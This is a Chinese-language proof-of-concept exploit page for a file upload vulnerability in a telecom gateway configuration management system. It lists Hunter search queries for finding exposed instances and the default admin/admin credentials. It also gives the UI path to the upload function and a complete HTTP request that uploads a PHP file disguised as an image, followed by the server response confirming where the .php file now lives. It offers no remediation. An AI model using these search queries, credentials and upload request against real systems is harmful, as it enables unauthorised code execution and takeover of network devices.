# 电信网关配置管理系统 文件上传漏洞

## 网络测绘

hunter: web.body="img/dl.gif" and web.title="系统登录"

hunter: web.body="img/login_bg3.png" and web.title="系统登录"

## POC / EXP

```
默认用户名：admin
默认密码：admin
```

上传位置

```
终端管理 -> 终端应用管理 -> 选择模板1 -> 直接创建(节目名称自动获取) -> 图片插入 -> 抓包修改文件名为.php
```

```
/manager/proEditor/makeProgramIndex.html
```

请求包

```
POST /manager/teletext/material/upload.php?type=img&w=1280&h=720&userid=1000398&appid=1&uploadtime=20230608_081737_1686226657578 HTTP/1.1
Host: x.x.x.x
Content-Length: 787
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAAqsNX1czifvqDHu
Accept: */*
Origin: http://x.x.x.x
Referer: http://x.x.x.x/manager/proEditor/makeProgramWorkSpace.html
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=1mr3udle5m1ptuj0c0hcpc5lt3
Connection: close

------WebKitFormBoundaryAAqsNX1czifvqDHu
Content-Disposition: form-data; name="fileToUpload"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundaryAAqsNX1czifvqDHu
Content-Disposition: form-data; name="type"

img
------WebKitFormBoundaryAAqsNX1czifvqDHu
Content-Disposition: form-data; name="w"

1280
------WebKitFormBoundaryAAqsNX1czifvqDHu
Content-Disposition: form-data; name="h"

720
------WebKitFormBoundaryAAqsNX1czifvqDHu
Content-Disposition: form-data; name="userid"

1000398
------WebKitFormBoundaryAAqsNX1czifvqDHu
Content-Disposition: form-data; name="appid"

1
------WebKitFormBoundaryAAqsNX1czifvqDHu
Content-Disposition: form-data; name="uploadtime"

20230608_081737_1686226657578
------WebKitFormBoundaryAAqsNX1czifvqDHu--
```

响应体

```
HTTP/1.1 200 OK
Date: Thu, 08 Jun 2023 13:20:22 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.3.3
Access-Control-Allow-Origin: *
Content-Length: 92
Connection: close
Content-Type: application/json; charset=UTF-8

{"ret":0,"ret_msg":"success","url":"\/xmedia\/material\/20230608_081737_1686226657578t.php"}
```